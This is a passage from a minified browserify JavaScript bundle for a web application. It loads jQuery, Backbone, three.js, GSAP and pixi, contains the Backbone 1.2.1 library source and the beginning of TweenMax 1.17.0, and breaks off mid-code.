(function e(t,n,r){function s(o,u){if(!n[o]){if(!t[o]){var a=typeof require=="function"&&require;if(!u&&a)return a(o,!0);if(i)return i(o,!0);var f=new Error("Cannot find module '"+o+"'");throw f.code="MODULE_NOT_FOUND",f}var l=n[o]={exports:{}};t[o][0].call(l.exports,function(e){var n=t[o][1][e];return s(n?n:e)},l,l.exports,e,t,n,r)}return n[o].exports}var i=typeof require=="function"&&require;for(var o=0;o<r.length;o++)s(r[o]);return s})({1:[function(require,module,exports){
window.$=window.jQuery=require("jquery"),window._=require("lodash"),window.Backbone=require("backbone"),Backbone.$=$,require("perfect-scrollbar/jquery")($),window.THREE=require("shared/lib/three.js-master/build/three.js"),window.THREE.ImageUtils.crossOrigin="",require("shared/lib/three.js-master/examples/js/renderers/CSS3DRenderer"),require("gsap"),require("shared/lib/pixi.js-master/bin/pixi.min"),require("utils/consolesave"),require("shared/console");var ns=require("shared/namespace");ns.templates=require("templates"),ns.audioProxy=require("shared/audioproxy"),ns.user=require("shared/user");var AppView=require("views/view-main");$(function(){var e="_app_"+Math.floor(1e10*Math.random());window[e]=new AppView({el:$("#app"),token:e})}),$("#preloader").remove();
},{"backbone":2,"gsap":3,"jquery":6,"lodash":21,"perfect-scrollbar/jquery":22,"shared/audioproxy":108,"shared/console":110,"shared/lib/pixi.js-master/bin/pixi.min":125,"shared/lib/three.js-master/build/three.js":129,"shared/lib/three.js-master/examples/js/renderers/CSS3DRenderer":134,"shared/namespace":140,"shared/user":213,"templates":48,"utils/consolesave":58,"views/view-main":85}],2:[function(require,module,exports){
(function (global){
!function(t){var e="object"==typeof self&&self.self==self&&self||"object"==typeof global&&global.global==global&&global;if("function"==typeof define&&define.amd)define(["underscore","jquery","exports"],function(i,n,s){e.Backbone=t(e,s,i,n)});else if("undefined"!=typeof exports){var i,n=require("underscore");try{i=require("jquery")}catch(s){}t(e,exports,n,i)}else e.Backbone=t(e,{},e._,e.jQuery||e.Zepto||e.ender||e.$)}(function(t,e,i,n){var s=t.Backbone,r=[].slice;e.VERSION="1.2.1",e.$=n,e.noConflict=function(){return t.Backbone=s,this},e.emulateHTTP=!1,e.emulateJSON=!1;var a=function(t,e,n){switch(t){case 1:return function(){return i[e](this[n])};case 2:return function(t){return i[e](this[n],t)};case 3:return function(t,s){return i[e](this[n],t,s)};case 4:return function(t,s,r){return i[e](this[n],t,s,r)};default:return function(){var t=r.call(arguments);return t.unshift(this[n]),i[e].apply(i,t)}}},o=function(t,e,n){i.each(e,function(e,s){i[s]&&(t.prototype[s]=a(e,s,n))})},h=e.Events={},u=/\s+/,c=function(t,e,n,s,r){var a,o=0;if(n&&"object"==typeof n){void 0!==s&&"context"in r&&void 0===r.context&&(r.context=s);for(a=i.keys(n);o<a.length;o++)e=t(e,a[o],n[a[o]],r)}else if(n&&u.test(n))for(a=n.split(u);o<a.length;o++)e=t(e,a[o],s,r);else e=t(e,n,s,r);return e};h.on=function(t,e,i){return l(this,t,e,i)};var l=function(t,e,i,n,s){if(t._events=c(d,t._events||{},e,i,{context:n,ctx:t,listening:s}),s){var r=t._listeners||(t._listeners={});r[s.id]=s}return t};h.listenTo=function(t,e,n){if(!t)return this;var s=t._listenId||(t._listenId=i.uniqueId("l")),r=this._listeningTo||(this._listeningTo={}),a=r[s];if(!a){var o=this._listenId||(this._listenId=i.uniqueId("l"));a=r[s]={obj:t,objId:s,id:o,listeningTo:r,count:0}}return l(t,e,n,this,a),this};var d=function(t,e,i,n){if(i){var s=t[e]||(t[e]=[]),r=n.context,a=n.ctx,o=n.listening;o&&o.count++,s.push({callback:i,context:r,ctx:r||a,listening:o})}return t};h.off=function(t,e,i){return this._events?(this._events=c(f,this._events,t,e,{context:i,listeners:this._listeners}),this):this},h.stopListening=function(t,e,n){var s=this._listeningTo;if(!s)return this;for(var r=t?[t._listenId]:i.keys(s),a=0;a<r.length;a++){var o=s[r[a]];if(!o)break;o.obj.off(e,n,this)}return i.isEmpty(s)&&(this._listeningTo=void 0),this};var f=function(t,e,n,s){if(t){var r,a=0,o=s.context,h=s.listeners;if(e||n||o){for(var u=e?[e]:i.keys(t);a<u.length;a++){e=u[a];var c=t[e];if(!c)break;for(var l=[],d=0;d<c.length;d++){var f=c[d];n&&n!==f.callback&&n!==f.callback._callback||o&&o!==f.context?l.push(f):(r=f.listening,r&&0===--r.count&&(delete h[r.id],delete r.listeningTo[r.objId]))}l.length?t[e]=l:delete t[e]}return i.size(t)?t:void 0}for(var g=i.keys(h);a<g.length;a++)r=h[g[a]],delete h[r.id],delete r.listeningTo[r.objId]}};h.once=function(t,e,n){var s=c(g,{},t,e,i.bind(this.off,this));return this.on(s,void 0,n)},h.listenToOnce=function(t,e,n){var s=c(g,{},e,n,i.bind(this.stopListening,this,t));return this.listenTo(t,s)};var g=function(t,e,n,s){if(n){var r=t[e]=i.once(function(){s(e,r),n.apply(this,arguments)});r._callback=n}return t};h.trigger=function(t){if(!this._events)return this;for(var e=Math.max(0,arguments.length-1),i=Array(e),n=0;e>n;n++)i[n]=arguments[n+1];return c(v,this._events,t,void 0,i),this};var v=function(t,e,i,n){if(t){var s=t[e],r=t.all;s&&r&&(r=r.slice()),s&&p(s,n),r&&p(r,[e].concat(n))}return t},p=function(t,e){var i,n=-1,s=t.length,r=e[0],a=e[1],o=e[2];switch(e.length){case 0:for(;++n<s;)(i=t[n]).callback.call(i.ctx);return;case 1:for(;++n<s;)(i=t[n]).callback.call(i.ctx,r);return;case 2:for(;++n<s;)(i=t[n]).callback.call(i.ctx,r,a);return;case 3:for(;++n<s;)(i=t[n]).callback.call(i.ctx,r,a,o);return;default:for(;++n<s;)(i=t[n]).callback.apply(i.ctx,e);return}};h.bind=h.on,h.unbind=h.off,i.extend(e,h);var m=e.Model=function(t,e){var n=t||{};e||(e={}),this.cid=i.uniqueId(this.cidPrefix),this.attributes={},e.collection&&(this.collection=e.collection),e.parse&&(n=this.parse(n,e)||{}),n=i.defaults({},n,i.result(this,"defaults")),this.set(n,e),this.changed={},this.initialize.apply(this,arguments)};i.extend(m.prototype,h,{changed:null,validationError:null,idAttribute:"id",cidPrefix:"c",initialize:function(){},toJSON:function(t){return i.clone(this.attributes)},sync:function(){return e.sync.apply(this,arguments)},get:function(t){return this.attributes[t]},escape:function(t){return i.escape(this.get(t))},has:function(t){return null!=this.get(t)},matches:function(t){return!!i.iteratee(t,this)(this.attributes)},set:function(t,e,n){if(null==t)return this;var s;if("object"==typeof t?(s=t,n=e):(s={})[t]=e,n||(n={}),!this._validate(s,n))return!1;var r=n.unset,a=n.silent,o=[],h=this._changing;this._changing=!0,h||(this._previousAttributes=i.clone(this.attributes),this.changed={});var u=this.attributes,c=this.changed,l=this._previousAttributes;this.idAttribute in s&&(this.id=s[this.idAttribute]);for(var d in s)e=s[d],i.isEqual(u[d],e)||o.push(d),i.isEqual(l[d],e)?delete c[d]:c[d]=e,r?delete u[d]:u[d]=e;if(!a){o.length&&(this._pending=n);for(var f=0;f<o.length;f++)this.trigger("change:"+o[f],this,u[o[f]],n)}if(h)return this;if(!a)for(;this._pending;)n=this._pending,this._pending=!1,this.trigger("change",this,n);return this._pending=!1,this._changing=!1,this},unset:function(t,e){return this.set(t,void 0,i.extend({},e,{unset:!0}))},clear:function(t){var e={};for(var n in this.attributes)e[n]=void 0;return this.set(e,i.extend({},t,{unset:!0}))},hasChanged:function(t){return null==t?!i.isEmpty(this.changed):i.has(this.changed,t)},changedAttributes:function(t){if(!t)return this.hasChanged()?i.clone(this.changed):!1;var e=this._changing?this._previousAttributes:this.attributes,n={};for(var s in t){var r=t[s];i.isEqual(e[s],r)||(n[s]=r)}return i.size(n)?n:!1},previous:function(t){return null!=t&&this._previousAttributes?this._previousAttributes[t]:null},previousAttributes:function(){return i.clone(this._previousAttributes)},fetch:function(t){t=i.extend({parse:!0},t);var e=this,n=t.success;return t.success=function(i){var s=t.parse?e.parse(i,t):i;return e.set(s,t)?(n&&n.call(t.context,e,i,t),void e.trigger("sync",e,i,t)):!1},q(this,t),this.sync("read",this,t)},save:function(t,e,n){var s;null==t||"object"==typeof t?(s=t,n=e):(s={})[t]=e,n=i.extend({validate:!0,parse:!0},n);var r=n.wait;if(s&&!r){if(!this.set(s,n))return!1}else if(!this._validate(s,n))return!1;var a=this,o=n.success,h=this.attributes;n.success=function(t){a.attributes=h;var e=n.parse?a.parse(t,n):t;return r&&(e=i.extend({},s,e)),e&&!a.set(e,n)?!1:(o&&o.call(n.context,a,t,n),void a.trigger("sync",a,t,n))},q(this,n),s&&r&&(this.attributes=i.extend({},h,s));var u=this.isNew()?"create":n.patch?"patch":"update";"patch"!==u||n.attrs||(n.attrs=s);var c=this.sync(u,this,n);return this.attributes=h,c},destroy:function(t){t=t?i.clone(t):{};var e=this,n=t.success,s=t.wait,r=function(){e.stopListening(),e.trigger("destroy",e,e.collection,t)};t.success=function(i){s&&r(),n&&n.call(t.context,e,i,t),e.isNew()||e.trigger("sync",e,i,t)};var a=!1;return this.isNew()?i.defer(t.success):(q(this,t),a=this.sync("delete",this,t)),s||r(),a},url:function(){var t=i.result(this,"urlRoot")||i.result(this.collection,"url")||M();if(this.isNew())return t;var e=this.get(this.idAttribute);return t.replace(/[^\/]$/,"$&/")+encodeURIComponent(e)},parse:function(t,e){return t},clone:function(){return new this.constructor(this.attributes)},isNew:function(){return!this.has(this.idAttribute)},isValid:function(t){return this._validate({},i.defaults({validate:!0},t))},_validate:function(t,e){if(!e.validate||!this.validate)return!0;t=i.extend({},this.attributes,t);var n=this.validationError=this.validate(t,e)||null;return n?(this.trigger("invalid",this,n,i.extend(e,{validationError:n})),!1):!0}});var _={keys:1,values:1,pairs:1,invert:1,pick:0,omit:0,chain:1,isEmpty:1};o(m,_,"attributes");var y=e.Collection=function(t,e){e||(e={}),e.model&&(this.model=e.model),void 0!==e.comparator&&(this.comparator=e.comparator),this._reset(),this.initialize.apply(this,arguments),t&&this.reset(t,i.extend({silent:!0},e))},b={add:!0,remove:!0,merge:!0},x={add:!0,remove:!1};i.extend(y.prototype,h,{model:m,initialize:function(){},toJSON:function(t){return this.map(function(e){return e.toJSON(t)})},sync:function(){return e.sync.apply(this,arguments)},add:function(t,e){return this.set(t,i.extend({merge:!1},e,x))},remove:function(t,e){e=i.extend({},e);var n=!i.isArray(t);t=n?[t]:i.clone(t);var s=this._removeModels(t,e);return!e.silent&&s&&this.trigger("update",this,e),n?s[0]:s},set:function(t,e){e=i.defaults({},e,b),e.parse&&!this._isModel(t)&&(t=this.parse(t,e));var n=!i.isArray(t);t=n?t?[t]:[]:t.slice();var s,r,a,o,h,u=e.at;null!=u&&(u=+u),0>u&&(u+=this.length+1);for(var c=this.comparator&&null==u&&e.sort!==!1,l=i.isString(this.comparator)?this.comparator:null,d=[],f=[],g={},v=e.add,p=e.merge,m=e.remove,_=!c&&v&&m?[]:!1,y=!1,x=0;x<t.length;x++){if(a=t[x],o=this.get(a))m&&(g[o.cid]=!0),p&&a!==o&&(a=this._isModel(a)?a.attributes:a,e.parse&&(a=o.parse(a,e)),o.set(a,e),c&&!h&&o.hasChanged(l)&&(h=!0)),t[x]=o;else if(v){if(r=t[x]=this._prepareModel(a,e),!r)continue;d.push(r),this._addReference(r,e)}r=o||r,r&&(s=this.modelId(r.attributes),!_||!r.isNew()&&g[s]||(_.push(r),y=y||!this.models[x]||r.cid!==this.models[x].cid),g[s]=!0)}if(m){for(var x=0;x<this.length;x++)g[(r=this.models[x]).cid]||f.push(r);f.length&&this._removeModels(f,e)}if(d.length||y)if(c&&(h=!0),this.length+=d.length,null!=u)for(var x=0;x<d.length;x++)this.models.splice(u+x,0,d[x]);else{_&&(this.models.length=0);for(var w=_||d,x=0;x<w.length;x++)this.models.push(w[x])}if(h&&this.sort({silent:!0}),!e.silent){for(var E=null!=u?i.clone(e):e,x=0;x<d.length;x++)null!=u&&(E.index=u+x),(r=d[x]).trigger("add",r,this,E);(h||y)&&this.trigger("sort",this,e),(d.length||f.length)&&this.trigger("update",this,e)}return n?t[0]:t},reset:function(t,e){e=e?i.clone(e):{};for(var n=0;n<this.models.length;n++)this._removeReference(this.models[n],e);return e.previousModels=this.models,this._reset(),t=this.add(t,i.extend({silent:!0},e)),e.silent||this.trigger("reset",this,e),t},push:function(t,e){return this.add(t,i.extend({at:this.length},e))},pop:function(t){var e=this.at(this.length-1);return this.remove(e,t)},unshift:function(t,e){return this.add(t,i.extend({at:0},e))},shift:function(t){var e=this.at(0);return this.remove(e,t)},slice:function(){return r.apply(this.models,arguments)},get:function(t){if(null==t)return void 0;var e=this.modelId(this._isModel(t)?t.attributes:t);return this._byId[t]||this._byId[e]||this._byId[t.cid]},at:function(t){return 0>t&&(t+=this.length),this.models[t]},where:function(t,e){var n=i.matches(t);return this[e?"find":"filter"](function(t){return n(t.attributes)})},findWhere:function(t){return this.where(t,!0)},sort:function(t){if(!this.comparator)throw new Error("Cannot sort a set without a comparator");return t||(t={}),i.isString(this.comparator)||1===this.comparator.length?this.models=this.sortBy(this.comparator,this):this.models.sort(i.bind(this.comparator,this)),t.silent||this.trigger("sort",this,t),this},pluck:function(t){return i.invoke(this.models,"get",t)},fetch:function(t){t=i.extend({parse:!0},t);var e=t.success,n=this;return t.success=function(i){var s=t.reset?"reset":"set";n[s](i,t),e&&e.call(t.context,n,i,t),n.trigger("sync",n,i,t)},q(this,t),this.sync("read",this,t)},create:function(t,e){e=e?i.clone(e):{};var n=e.wait;if(t=this._prepareModel(t,e),!t)return!1;n||this.add(t,e);var s=this,r=e.success;return e.success=function(t,e,i){n&&s.add(t,i),r&&r.call(i.context,t,e,i)},t.save(null,e),t},parse:function(t,e){return t},clone:function(){return new this.constructor(this.models,{model:this.model,comparator:this.comparator})},modelId:function(t){return t[this.model.prototype.idAttribute||"id"]},_reset:function(){this.length=0,this.models=[],this._byId={}},_prepareModel:function(t,e){if(this._isModel(t))return t.collection||(t.collection=this),t;e=e?i.clone(e):{},e.collection=this;var n=new this.model(t,e);return n.validationError?(this.trigger("invalid",this,n.validationError,e),!1):n},_removeModels:function(t,e){for(var i=[],n=0;n<t.length;n++){var s=this.get(t[n]);if(s){var r=this.indexOf(s);this.models.splice(r,1),this.length--,e.silent||(e.index=r,s.trigger("remove",s,this,e)),i.push(s),this._removeReference(s,e)}}return i.length?i:!1},_isModel:function(t){return t instanceof m},_addReference:function(t,e){this._byId[t.cid]=t;var i=this.modelId(t.attributes);null!=i&&(this._byId[i]=t),t.on("all",this._onModelEvent,this)},_removeReference:function(t,e){delete this._byId[t.cid];var i=this.modelId(t.attributes);null!=i&&delete this._byId[i],this===t.collection&&delete t.collection,t.off("all",this._onModelEvent,this)},_onModelEvent:function(t,e,i,n){if("add"!==t&&"remove"!==t||i===this){if("destroy"===t&&this.remove(e,n),"change"===t){var s=this.modelId(e.previousAttributes()),r=this.modelId(e.attributes);s!==r&&(null!=s&&delete this._byId[s],null!=r&&(this._byId[r]=e))}this.trigger.apply(this,arguments)}}});var w={forEach:3,each:3,map:3,collect:3,reduce:4,foldl:4,inject:4,reduceRight:4,foldr:4,find:3,detect:3,filter:3,select:3,reject:3,every:3,all:3,some:3,any:3,include:2,contains:2,invoke:0,max:3,min:3,toArray:1,size:1,first:3,head:3,take:3,initial:3,rest:3,tail:3,drop:3,last:3,without:0,difference:0,indexOf:3,shuffle:1,lastIndexOf:3,isEmpty:1,chain:1,sample:3,partition:3};o(y,w,"models");var E=["groupBy","countBy","sortBy","indexBy"];i.each(E,function(t){i[t]&&(y.prototype[t]=function(e,n){var s=i.isFunction(e)?e:function(t){return t.get(e)};return i[t](this.models,s,n)})});var k=e.View=function(t){this.cid=i.uniqueId("view"),i.extend(this,i.pick(t,I)),this._ensureElement(),this.initialize.apply(this,arguments)},S=/^(\S+)\s*(.*)$/,I=["model","collection","el","id","attributes","className","tagName","events"];i.extend(k.prototype,h,{tagName:"div",$:function(t){return this.$el.find(t)},initialize:function(){},render:function(){return this},remove:function(){return this._removeElement(),this.stopListening(),this},_removeElement:function(){this.$el.remove()},setElement:function(t){return this.undelegateEvents(),this._setElement(t),this.delegateEvents(),this},_setElement:function(t){this.$el=t instanceof e.$?t:e.$(t),this.el=this.$el[0]},delegateEvents:function(t){if(t||(t=i.result(this,"events")),!t)return this;this.undelegateEvents();for(var e in t){var n=t[e];if(i.isFunction(n)||(n=this[n]),n){var s=e.match(S);this.delegate(s[1],s[2],i.bind(n,this))}}return this},delegate:function(t,e,i){return this.$el.on(t+".delegateEvents"+this.cid,e,i),this},undelegateEvents:function(){return this.$el&&this.$el.off(".delegateEvents"+this.cid),this},undelegate:function(t,e,i){return this.$el.off(t+".delegateEvents"+this.cid,e,i),this},_createElement:function(t){return document.createElement(t)},_ensureElement:function(){if(this.el)this.setElement(i.result(this,"el"));else{var t=i.extend({},i.result(this,"attributes"));this.id&&(t.id=i.result(this,"id")),this.className&&(t["class"]=i.result(this,"className")),this.setElement(this._createElement(i.result(this,"tagName"))),this._setAttributes(t)}},_setAttributes:function(t){this.$el.attr(t)}}),e.sync=function(t,n,s){var r=T[t];i.defaults(s||(s={}),{emulateHTTP:e.emulateHTTP,emulateJSON:e.emulateJSON});var a={type:r,dataType:"json"};if(s.url||(a.url=i.result(n,"url")||M()),null!=s.data||!n||"create"!==t&&"update"!==t&&"patch"!==t||(a.contentType="application/json",a.data=JSON.stringify(s.attrs||n.toJSON(s))),s.emulateJSON&&(a.contentType="application/x-www-form-urlencoded",a.data=a.data?{model:a.data}:{}),s.emulateHTTP&&("PUT"===r||"DELETE"===r||"PATCH"===r)){a.type="POST",s.emulateJSON&&(a.data._method=r);var o=s.beforeSend;s.beforeSend=function(t){return t.setRequestHeader("X-HTTP-Method-Override",r),o?o.apply(this,arguments):void 0}}"GET"===a.type||s.emulateJSON||(a.processData=!1);var h=s.error;s.error=function(t,e,i){s.textStatus=e,s.errorThrown=i,h&&h.call(s.context,t,e,i)};var u=s.xhr=e.ajax(i.extend(a,s));return n.trigger("request",n,u,s),u};var T={create:"POST",update:"PUT",patch:"PATCH","delete":"DELETE",read:"GET"};e.ajax=function(){return e.$.ajax.apply(e.$,arguments)};var P=e.Router=function(t){t||(t={}),t.routes&&(this.routes=t.routes),this._bindRoutes(),this.initialize.apply(this,arguments)},H=/\((.*?)\)/g,$=/(\(\?)?:\w+/g,A=/\*\w+/g,C=/[\-{}\[\]+?.,\\\^$|#\s]/g;i.extend(P.prototype,h,{initialize:function(){},route:function(t,n,s){i.isRegExp(t)||(t=this._routeToRegExp(t)),i.isFunction(n)&&(s=n,n=""),s||(s=this[n]);var r=this;return e.history.route(t,function(i){var a=r._extractParameters(t,i);r.execute(s,a,n)!==!1&&(r.trigger.apply(r,["route:"+n].concat(a)),r.trigger("route",n,a),e.history.trigger("route",r,n,a))}),this},execute:function(t,e,i){t&&t.apply(this,e)},navigate:function(t,i){return e.history.navigate(t,i),this},_bindRoutes:function(){if(this.routes){this.routes=i.result(this,"routes");for(var t,e=i.keys(this.routes);null!=(t=e.pop());)this.route(t,this.routes[t])}},_routeToRegExp:function(t){return t=t.replace(C,"\\$&").replace(H,"(?:$1)?").replace($,function(t,e){return e?t:"([^/?]+)"}).replace(A,"([^?]*?)"),new RegExp("^"+t+"(?:\\?([\\s\\S]*))?$")},_extractParameters:function(t,e){var n=t.exec(e).slice(1);return i.map(n,function(t,e){return e===n.length-1?t||null:t?decodeURIComponent(t):null})}});var N=e.History=function(){this.handlers=[],i.bindAll(this,"checkUrl"),"undefined"!=typeof window&&(this.location=window.location,this.history=window.history)},R=/^[#\/]|\s+$/g,j=/^\/+|\/+$/g,O=/#.*$/;N.started=!1,i.extend(N.prototype,h,{interval:50,atRoot:function(){var t=this.location.pathname.replace(/[^\/]$/,"$&/");return t===this.root&&!this.getSearch()},matchRoot:function(){var t=this.decodeFragment(this.location.pathname),e=t.slice(0,this.root.length-1)+"/";return e===this.root},decodeFragment:function(t){return decodeURI(t.replace(/%25/g,"%2525"))},getSearch:function(){var t=this.location.href.replace(/#.*/,"").match(/\?.+/);return t?t[0]:""},getHash:function(t){var e=(t||this).location.href.match(/#(.*)$/);return e?e[1]:""},getPath:function(){var t=this.decodeFragment(this.location.pathname+this.getSearch()).slice(this.root.length-1);return"/"===t.charAt(0)?t.slice(1):t},getFragment:function(t){return null==t&&(t=this._usePushState||!this._wantsHashChange?this.getPath():this.getHash()),t.replace(R,"")},start:function(t){if(N.started)throw new Error("Backbone.history has already been started");if(N.started=!0,this.options=i.extend({root:"/"},this.options,t),this.root=this.options.root,this._wantsHashChange=this.options.hashChange!==!1,this._hasHashChange="onhashchange"in window,this._useHashChange=this._wantsHashChange&&this._hasHashChange,this._wantsPushState=!!this.options.pushState,this._hasPushState=!(!this.history||!this.history.pushState),this._usePushState=this._wantsPushState&&this._hasPushState,this.fragment=this.getFragment(),this.root=("/"+this.root+"/").replace(j,"/"),this._wantsHashChange&&this._wantsPushState){if(!this._hasPushState&&!this.atRoot()){var e=this.root.slice(0,-1)||"/";return this.location.replace(e+"#"+this.getPath()),!0}this._hasPushState&&this.atRoot()&&this.navigate(this.getHash(),{replace:!0})}if(!this._hasHashChange&&this._wantsHashChange&&!this._usePushState){this.iframe=document.createElement("iframe"),this.iframe.src="javascript:0",this.iframe.style.display="none",this.iframe.tabIndex=-1;var n=document.body,s=n.insertBefore(this.iframe,n.firstChild).contentWindow;s.document.open(),s.document.close(),s.location.hash="#"+this.fragment}var r=window.addEventListener||function(t,e){return attachEvent("on"+t,e)};return this._usePushState?r("popstate",this.checkUrl,!1):this._useHashChange&&!this.iframe?r("hashchange",this.checkUrl,!1):this._wantsHashChange&&(this._checkUrlInterval=setInterval(this.checkUrl,this.interval)),this.options.silent?void 0:this.loadUrl()},stop:function(){var t=window.removeEventListener||function(t,e){return detachEvent("on"+t,e)};this._usePushState?t("popstate",this.checkUrl,!1):this._useHashChange&&!this.iframe&&t("hashchange",this.checkUrl,!1),this.iframe&&(document.body.removeChild(this.iframe),this.iframe=null),this._checkUrlInterval&&clearInterval(this._checkUrlInterval),N.started=!1},route:function(t,e){this.handlers.unshift({route:t,callback:e})},checkUrl:function(t){var e=this.getFragment();return e===this.fragment&&this.iframe&&(e=this.getHash(this.iframe.contentWindow)),e===this.fragment?!1:(this.iframe&&this.navigate(e),void this.loadUrl())},loadUrl:function(t){return this.matchRoot()?(t=this.fragment=this.getFragment(t),i.any(this.handlers,function(e){return e.route.test(t)?(e.callback(t),!0):void 0})):!1},navigate:function(t,e){if(!N.started)return!1;e&&e!==!0||(e={trigger:!!e}),t=this.getFragment(t||"");var i=this.root;(""===t||"?"===t.charAt(0))&&(i=i.slice(0,-1)||"/");var n=i+t;if(t=this.decodeFragment(t.replace(O,"")),this.fragment!==t){if(this.fragment=t,this._usePushState)this.history[e.replace?"replaceState":"pushState"]({},document.title,n);else{if(!this._wantsHashChange)return this.location.assign(n);if(this._updateHash(this.location,t,e.replace),this.iframe&&t!==this.getHash(this.iframe.contentWindow)){var s=this.iframe.contentWindow;e.replace||(s.document.open(),s.document.close()),this._updateHash(s.location,t,e.replace)}}return e.trigger?this.loadUrl(t):void 0}},_updateHash:function(t,e,i){if(i){var n=t.href.replace(/(javascript:|#).*$/,"");t.replace(n+"#"+e)}else t.hash="#"+e}}),e.history=new N;var U=function(t,e){var n,s=this;n=t&&i.has(t,"constructor")?t.constructor:function(){return s.apply(this,arguments)},i.extend(n,s,e);var r=function(){this.constructor=n};return r.prototype=s.prototype,n.prototype=new r,t&&i.extend(n.prototype,t),n.__super__=s.prototype,n};m.extend=y.extend=P.extend=k.extend=N.extend=U;var M=function(){throw new Error('A "url" property or function must be specified')},q=function(t,e){var i=e.error;e.error=function(n){i&&i.call(e.context,t,n,e),t.trigger("error",t,n,e)}};return e});
}).call(this,typeof global !== "undefined" ? global : typeof self !== "undefined" ? self : typeof window !== "undefined" ? window : {})
},{"jquery":6,"underscore":45}],3:[function(require,module,exports){
(function (global){
var _gsScope="undefined"!=typeof module&&module.exports&&"undefined"!=typeof global?global:this||window;(_gsScope._gsQueue||(_gsScope._gsQueue=[])).push(function(){"use strict";_gsScope._gsDefine("TweenMax",["core.Animation","core.SimpleTimeline","TweenLite"],function(t,e,i){var s=function(t){var e,i=[],s=t.length;for(e=0;e!==s;i.push(t[e++]));return i},r=function(t,e,s){i.call(this,t,e,s),this._cycle=0,this._yoyo=this.vars.yoyo===!0,this._repeat=this.vars.repeat||0,this._repeatDelay=this.vars.repeatDelay||0,this._dirty=!0,this.render=r.prototype.render},n=1e-10,a=i._internals,o=a.isSelector,h=a.isArray,l=r.prototype=i.to({},.1,{}),_=[];r.version="1.17.0",l.constructor=r,l.kill()._gc=!1,r.killTweensOf=r.killDelayedCallsTo=i.killTweensOf,r.getTweensOf=i.getTweensOf,r.lagSmoothing=i.lagSmoothing,r.ticker=i.ticker,r.render=i.render,l.invalidate=function(){return this._yoyo=this.vars.yoyo===!0,this._repeat=this.vars.repeat||0,this._repeatDelay=this.vars.repeatDelay||0,this._uncache(!0),i.prototype.invalidate.call(this)},l.updateTo=function(t,e){var s,r=this.ratio,n=this.vars.immediateRender||t.immediateRender;e&&this._startTime<this._timeline._time&&(this._startTime=this._timeline._time,this._uncache(!1),this._gc?this._enabled(!0,!1):this._timeline.insert(this,this._startTime-this._delay));for(s in t)this.vars[s]=t[s];if(this._initted||n)if(e)this._initted=!1,n&&this.render(0,!0,!0);else if(this._gc&&this._enabled(!0,!1),this._notifyPluginsOfEnabled&&this._firstPT&&i._onPluginEvent("_onDisable",this),this._time/this._duration>.998){var a=this._time;this.render(0,!0,!1),this._initted=!1,this.render(a,!0,!1)}else if(this._time>0||n){this._initted=!1,this._init();for(var o,h=1/(1-r),l=this._firstPT;l;)o=l.s+l.c,l.c*=h,l.s=o-l.c,l=l._next}return this},l.render=function(t,e,i){this._initted||0===this._duration&&this.vars.repeat&&this.invalidate();var s,r,o,h,l,_,u,c,f=this._dirty?this.totalDuration():this._totalDuration,p=this._time,m=this._totalTime,d=this._cycle,g=this._duration,v=this._rawPrevTime;if(t>=f?(this._totalTime=f,this._cycle=this._repeat,this._yoyo&&0!==(1&this._cycle)?(this._time=0,this.ratio=this._ease._calcEnd?this._ease.getRatio(0):0):(this._time=g,this.ratio=this._ease._calcEnd?this._ease.getRatio(1):1),this._reversed||(s=!0,r="onComplete",i=i||this._timeline.autoRemoveChildren),0===g&&(this._initted||!this.vars.lazy||i)&&(this._startTime===this._timeline._duration&&(t=0),(0===t||0>v||v===n)&&v!==t&&(i=!0,v>n&&(r="onReverseComplete")),this._rawPrevTime=c=!e||t||v===t?t:n)):1e-7>t?(this._totalTime=this._time=this._cycle=0,this.ratio=this._ease._calcEnd?this._ease.getRatio(0):0,(0!==m||0===g&&v>0)&&(r="onReverseComplete",s=this._reversed),0>t&&(this._active=!1,0===g&&(this._initted||!this.vars.lazy||i)&&(v>=0&&(i=!0),this._rawPrevTime=c=!e||t||v===t?t:n)),this._initted||(i=!0)):(this._totalTime=this._time=t,0!==this._repeat&&(h=g+this._repeatDelay,this._cycle=this._totalTime/h>>0,0!==this._cycle&&this._cycle===this._totalTime/h&&this._cycle--,this._time=this._totalTime-this._cycle*h,this._yoyo&&0!==(1&this._cycle)&&(this._time=g-this._time),this._time>g?this._time=g:this._time<0&&(this._time=0)),this._easeType?(l=this._time/g,_=this._easeType,u=this._easePower,(1===_||3===_&&l>=.5)&&(l=1-l),3===_&&(l*=2),1===u?l*=l:2===u?l*=l*l:3===u?l*=l*l*l:4===u&&(l*=l*l*l*l),1===_?this.ratio=1-l:2===_?this.ratio=l:this._time/g<.5?this.ratio=l/2:this.ratio=1-l/2):this.ratio=this._ease.getRatio(this._time/g)),p===this._time&&!i&&d===this._cycle)return void(m!==this._totalTime&&this._onUpdate&&(e||this._callback("onUpdate")));if(!this._initted){if(this._init(),!this._initted||this._gc)return;if(!i&&this._firstPT&&(this.vars.lazy!==!1&&this._duration||this.vars.lazy&&!this._duration))return this._time=p,this._totalTime=m,this._rawPrevTime=v,this._cycle=d,a.lazyTweens.push(this),void(this._lazy=[t,e]);this._time&&!s?this.ratio=this._ease.getRatio(this._time/g):s&&this._ease._calcEnd&&(this.ratio=this._ease.getRatio(0===this._time?0:1))}for(this._lazy!==!1&&(this._lazy=!1),this._active||!this._paused&&this._time!==p&&t>=0&&(this._active=!0),0===m&&(2===this._initted&&t>0&&this._init(),this._startAt&&(t>=0?this._startAt.render(t,e,i):r||(r="_dummyGS")),this.vars.onStart&&(0!==this._totalTime||0===g)&&(e||this._callback("onStart"))),o=this._firstPT;o;)o.f?o.t[o.p](o.c*this.ratio+o.s):o.t[o.p]=o.c*this.ratio+o.s,o=o._next;this._onUpdate&&(0>t&&this._startAt&&this._startTime&&this._startAt.render(t,e,i),e||(this._totalTime!==m||s)&&this._callback("onUpdate")),this._cycle!==d&&(e||this._gc||this.vars.onRepeat&&this._callback("onRepeat")),r&&(!this._gc||i)&&(0>t&&this._startAt&&!this._onUpdate&&this._startTime&&this._startAt.render(t,e,i),s&&(this._timeline.autoRemoveChildren&&this._enabled(!1,!1),this._active=!1),!e&&this.vars[r]&&this._callback(r),0===g&&this._rawPrevTime===n&&c!==n&&(this._rawPrevTime=0))},r.to=function(t,e,i){return new r(t,e,i)},r.from=function(t,e,i){return i.runBackwards=!0,i.immediateRender=0!=i.immediateRender,new r(t,e,i)},r.fromTo=function(t,e,i,s){return s.startAt=i,s.immediateRender=0!=s.immediateRender&&0!=i.immediateRender,new r(t,e,s)},r.staggerTo=r.allTo=function(t,e,n,a,l,u,c){a=a||0;var 